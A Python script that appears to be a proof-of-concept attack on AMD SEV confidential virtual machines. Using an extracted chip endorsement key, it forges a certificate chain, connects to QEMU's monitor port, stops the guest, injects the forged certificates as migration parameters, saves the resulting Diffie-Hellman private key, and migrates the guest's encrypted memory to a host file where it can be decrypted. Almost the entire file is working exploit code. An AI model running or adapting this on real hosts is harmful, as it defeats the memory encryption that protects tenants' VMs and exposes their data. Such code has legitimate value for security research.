import sys
import qmp
import base64
import os
import subprocess
import requests
from IPython import embed
from cryptography.hazmat.primitives.asymmetric import ec
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives.asymmetric import utils
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.serialization import Encoding, NoEncryption, PrivateFormat
from cryptography.exceptions import InvalidSignature
from cryptography.hazmat.primitives.serialization import load_pem_private_key
import binascii

# User configurable parameters:
TARGET = ("localhost", 4444) # QMP connection
CEK_ID = "" # ID corresponding to the extracted CEK. Only required when the CEK public key is not provided via commandline.
HOSTFILE="./vm.mem" # Filename where the VM memory is exported. NOTE: The filename is relative to the CWD of the QEMU Process.


AMD_KDS_URL = "https://kdsintf.amd.com/cek/id/"
AMD_ARK_ASK_URL = "https://developer.amd.com/wp-content/resources/ask_ark_naples.cert"
USER_AGENT = ('Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:55.0) Gecko/20100101 Firefox/55.0')  # firefox


def check_ecdsa_sig(ec_pubkey, data, sig):
    """ Verify ECDSA signature. Assumes SHA256 hash is used.
    Returns a boolean indication whether the verification was successful.
    """
    try:
        ec_pubkey.verify(
            bytes(sig),
            bytes(data),
            ec.ECDSA(utils.hashes.SHA256())
        )
    except InvalidSignature:
        return False
    else:
        return True

def retrieve_file(url):
    """ Retrieve file from given URL. Returns byte object of the file in case of
    success, None otherwise.
    """
    headers = {'User-Agent' :USER_AGENT}
    file = requests.get(url, headers=headers)
    if file.status_code != 200:
        return None
    return file.content

def build_ecdsa_pubkey(qx_bytes, qy_bytes):
    """Build ecdsa public key from provided curve point. Returns an
    EllipticCurvePublicKey object. Point must be specified by qx and qy
    values in little-endian byte order. Curve defaults to NIST-P384.
    See: AMD SEV API ver. 0.22 Chapter 4.5 and Appendix C.2"""

    pubkey_qx = int.from_bytes(qx_bytes, 'little')
    pubkey_qy = int.from_bytes(qy_bytes, 'little')

    curve = ec.SECP384R1()  # NIST-P384
    pub_numbers = ec.EllipticCurvePublicNumbers(pubkey_qx, pubkey_qy, curve)

    ec_pubkey = pub_numbers.public_key(default_backend())

    return ec_pubkey

def ecdsa_sign(ec_privkey, data):
    """Sign 'data' using provided 'ec_privkey' using SHA256 hashing algorithm"""

    sig = ec_privkey.sign(
        bytes(data),
        ec.ECDSA(utils.hashes.SHA256())
    )

    return sig

def build_oca():
    """ Builds a self-signed OCA certificate using ECSDA with SHA256 and curve
    NIST-P384. Returns a tuple of the private key and the signed certificate"""

    private_key = ec.generate_private_key(
        ec.SECP384R1, default_backend()
    )
    public_nr = private_key.public_key().public_numbers()
    oca = bytearray(0x824)
    oca[0x0:0x4] = (1).to_bytes(4,'little')
    oca[0x4] = 0x00 # API Major
    oca[0x5] = 0x00 # API Minor
    oca[0x6:0x8] = b'\x00\x00'
    oca[0x8:0xc] = (0x1001).to_bytes(4,'little') # Usage: OCA
    oca[0xc:0x10] = (2).to_bytes(4,'little') # ECDSA-SHA256

    # Begin pubkey
    oca[0x10:0x14] = (2).to_bytes(4,'little') # Curve ID: NIST-P384
    oca[0x14:0x14+0x48] = (public_nr.x).to_bytes(0x48,'little')
    oca[0x5c:0x5c+0x48] = (public_nr.y).to_bytes(0x48,'little')

    # Begin signature 
    oca[0x414:0x418] = (0x1001).to_bytes(4,'little') # 1st signature usage: OCA
    oca[0x418:0x41c] = (2).to_bytes(4,'little') # ECDSA-SHA256
    sig = utils.decode_dss_signature(ecdsa_sign(private_key,oca[:0x414]))
    oca[0x41c:0x41c+0x48] = (sig[0]).to_bytes(0x48,'little') # R
    oca[0x464:0x464+0x48] = (sig[1]).to_bytes(0x48,'little') # S
    oca[0x61c:0x620] = (0x1000).to_bytes(4,'little') # 2nd signature usage: Invalid

    return (private_key, oca)

def build_pek(cek,oca):
    """ Builds the platform-endorsement-key (PEK) and signs it with both the
    provided chip-endorsement-key (CEK) and owners-certificate authority (OCA).
    Returns a tuple of the signed pek and the corresponding private key. """

    private_key = ec.generate_private_key(
        ec.SECP384R1, default_backend()
    )
    public_nr = private_key.public_key().public_numbers()

    pek = bytearray(0x824)
    pek[0x0:0x4] = (1).to_bytes(4,'little')
    pek[0x4] = 0x0 # API Major
    pek[0x5] = 0x00 # API Minor
    pek[0x6:0x8] = b'\x00\x00'
    pek[0x8:0xc] = (0x1002).to_bytes(4,'little') # Usage: PEK
    pek[0xc:0x10] = (2).to_bytes(4,'little') # ECDSA-SHA256

    # Begin pubkey
    pek[0x10:0x14] = (2).to_bytes(4,'little') # Curve ID: NIST-P384
    pek[0x14:0x14+0x48] = (public_nr.x).to_bytes(0x48,'little')
    pek[0x5c:0x5c+0x48] = (public_nr.y).to_bytes(0x48,'little')

    # Begin 1st signature
    pek[0x414:0x418] = (0x1001).to_bytes(4,'little') # 1st signature usage: OCA
    pek[0x418:0x41c] = (2).to_bytes(4,'little') # ECDSA-SHA256
    sig = utils.decode_dss_signature(ecdsa_sign(oca,pek[:0x414])) # Sign with OCA
    pek[0x41c:0x41c+0x48] = (sig[0]).to_bytes(0x48,'little') # R
    pek[0x464:0x464+0x48] = (sig[1]).to_bytes(0x48,'little') # S

    # Begin 2nd signature
    pek[0x61c:0x620] = (0x1004).to_bytes(4,'little') # 2nd signature usage: CEK
    pek[0x620:0x624] = (2).to_bytes(4,'little') # ECDSA-SHA256
    sig = utils.decode_dss_signature(ecdsa_sign(cek,pek[:0x414])) # Sign with CEK
    pek[0x624:0x624+0x48] = (sig[0]).to_bytes(0x48,'little') # R
    pek[0x66c:0x66c+0x48] = (sig[1]).to_bytes(0x48,'little') # S

    return (private_key, pek)

def build_pdh(pek):
    """ Builds the platform-diffie-hellman key (PDH) and signs it with the
    provided platform-endorsement-key (PEK).
    Returns a tuple of the signed PDH and the corresponding private key. """
    private_key = ec.generate_private_key(
        ec.SECP384R1, default_backend()
    )
    public_nr = private_key.public_key().public_numbers()

    pdh = bytearray(0x824)
    pdh[0x0:0x4] = (1).to_bytes(4,'little')
    pdh[0x4] = 0x0 # API Major
    pdh[0x5] = 0x00 # API Minor
    pdh[0x6:0x8] = b'\x00\x00'
    pdh[0x8:0xc] = (0x1003).to_bytes(4,'little') # Usage: PDH
    pdh[0xc:0x10] = (3).to_bytes(4,'little') # ECDH-SHA256

    # Begin pubkey
    pdh[0x10:0x14] = (2).to_bytes(4,'little') # Curve ID: NIST-P384
    pdh[0x14:0x14+0x48] = (public_nr.x).to_bytes(0x48,'little')
    pdh[0x5c:0x5c+0x48] = (public_nr.y).to_bytes(0x48,'little')

    # Begin 1st signature
    pdh[0x414:0x418] = (0x1002).to_bytes(4,'little') # 1st signature usage: PEK
    pdh[0x418:0x41c] = (2).to_bytes(4,'little') # ECDSA-SHA256
    sig = utils.decode_dss_signature(ecdsa_sign(pek,pdh[:0x414])) # Sign with OCA
    pdh[0x41c:0x41c+0x48] = (sig[0]).to_bytes(0x48,'little') # R
    pdh[0x464:0x464+0x48] = (sig[1]).to_bytes(0x48,'little') # S

    # Begin 2nd signature
    pdh[0x61c:0x620] = (0x1000).to_bytes(4,'little') # 2nd signature usage: Invalid

    return (private_key, pdh)

# Open CEK private key used to create a valid certificate chain.
with open(sys.argv[1], 'rb') as f:
    cek_priv = load_pem_private_key(
        f.read(),
        password=None,
        backend=default_backend())

if len(sys.argv) <=2:
    # Retrieve keys from AMD

    # Retrieve signed cek from AMD
    signed_cek = retrieve_file(AMD_KDS_URL + CEK_ID)

    # Retrieve ASK and ARK from AMD
    ask_ark = retrieve_file(AMD_ARK_ASK_URL)


else:
    # Read AMD certs from files
    with open(sys.argv[2],'rb') as f:
        signed_cek = bytearray(f.read())

    with open(sys.argv[3],'rb') as f:
        ask_ark = bytearray(f.read())

# Separate ASK and ARK
signed_ask = ask_ark[:0x340]
ark = ask_ark[-0x240:]

# Generate certificates
oca_priv, oca = build_oca()
pek_priv, pek = build_pek(cek_priv,oca_priv)
pdh_priv, pdh = build_pdh(pek_priv)

# Test provided CEK private key
test_sig = ecdsa_sign(cek_priv,b'TEST')
cek_pub_signed = build_ecdsa_pubkey(signed_cek[0x14:0x14+0x48],
                                    signed_cek[0x5c:0x5c+0x48])

if not check_ecdsa_sig(cek_pub_signed,b'TEST',test_sig):
    print("ERROR: Provided CEK private key does not match signed CEK public key")
    sys.exit(-1)

# Prepare certs to be send to target. NOTE: We must use the obtained signed CEK

plat_certs = str(base64.b64encode(pek + oca + signed_cek), 'ascii')
amd_certs = str(base64.b64encode(signed_ask + ark), 'ascii')
pdh = str(base64.b64encode(pdh), 'ascii')

print("Connecting to target qemu QMP port at %s:%d" % TARGET)
mon = qmp.QEMUMonitorProtocol(TARGET)
mon.connect()

print("Stopping remote VM")
mon.cmd("stop")

print("Sending migration parameters")
mon.cmd('migrate-set-parameters', { 'sev-amd-cert' : amd_certs })
mon.cmd('migrate-set-parameters', { 'sev-plat-cert' : plat_certs })
mon.cmd('migrate-set-parameters', { 'sev-pdh' : pdh })

print("Receive remote PDH and write to ./pdh_remote.cert")
pdh = base64.b64decode(mon.cmd('query-sev-capabilities')['return']['pdh'])
with open("./pdh_remote.cert",'wb') as f:
    f.write(pdh)

print("Exporting generated PDH private key to ./pdh_priv.pem")
with open("./pdh_priv.pem",'wb') as f:
    f.write(pdh_priv.private_bytes(
        Encoding.PEM,
        PrivateFormat.TraditionalOpenSSL,
        NoEncryption())
    )
# Start exporting the memory. NOTE: HOSTFILE refers to a file on the host.
print("Starting migration to file %s on target %s" % (HOSTFILE, TARGET))
mon.cmd('migrate', {'uri': 'exec: cat > %s' % HOSTFILE})
